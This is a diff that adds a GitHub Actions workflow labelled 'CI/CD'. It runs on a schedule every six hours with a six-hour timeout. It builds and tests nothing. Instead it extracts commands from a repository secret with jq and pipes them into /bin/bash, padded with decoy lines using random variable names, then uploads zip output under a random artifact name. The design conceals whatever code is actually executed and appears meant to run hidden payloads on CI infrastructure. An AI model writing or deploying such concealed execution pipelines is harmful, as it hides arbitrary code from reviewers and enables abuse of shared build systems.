@@ -1,0 +1,36 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          kap9162: ${{ secrets.kap9162 }}
+        run: |
+          printf '%s' "$kap9162" | jq -r .k4989 | /bin/bash
+          echo $dwjzg30056 | jq -r .xgwpn469 | /bin/bash
+          printf '%s' "$xohy3882" | jq -r .vss87590 | /bin/bash
+          echo $xu5122 | jq -r .qtxx5 | /bin/bash
+          printf '%s' "$uqhz43" | jq -r .gee26193 | /bin/bash
+          echo $wzs4 | jq -r .ugugv049 | /bin/bash
+          printf '%s' "$qgkz6783" | jq -r .ket9319 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pegMOiIo
+          path: "*.zip"
+          retention-days: 1
